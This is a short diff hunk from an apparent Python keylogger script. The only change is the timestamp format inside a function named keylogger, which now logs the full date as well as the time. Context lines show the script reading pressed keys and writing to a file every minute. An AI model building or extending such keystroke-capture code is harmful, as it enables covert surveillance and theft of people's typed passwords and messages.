@@ -39,7 +39,7 @@ def write_to_file_every_minute():
 write_to_file_every_minute()
 
 def keylogger(key):
-    now = datetime.now().strftime("%H:%M")
+    now = datetime.now().strftime("%Y-%m-%d %H:%M")
 
     try:
         key_str = key.char
